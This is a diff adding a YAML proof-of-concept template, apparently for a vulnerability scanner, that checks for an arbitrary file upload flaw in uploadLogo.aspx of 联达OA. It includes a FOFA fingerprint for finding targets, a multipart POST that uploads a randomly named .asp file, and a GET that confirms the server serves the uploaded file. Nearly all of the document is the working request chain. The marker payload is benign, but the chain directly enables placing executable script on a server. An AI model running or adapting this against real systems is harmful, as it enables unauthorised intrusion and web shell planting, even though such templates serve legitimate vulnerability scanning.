@@ -1,0 +1,36 @@
+id: poc-yaml-lianda-oa-uploadlogo-aspx-anyfile-upload
+info:
+  name: 联达OA uploadLogo.aspx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 联达OA
+  fofa: app="联达OA"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /Hosp_Portal/uploadLogo.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
+  data: '--------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
+
+    Content-Disposition: form-data; name="DesignId"
+
+
+    1
+
+    --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
+
+    Content-Disposition: form-data; name="Filedata";filename="{{.t1}}.asp"
+
+
+    {{.t2}}
+
+    --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA--'
+  expression: status_code == 200 && contains(body,t1)
+- method: GET
+  path: /Hosp_Portal/Logo/{{.t1}}.asp
+  expression: status_code == 200 && body == t2
+transport: http
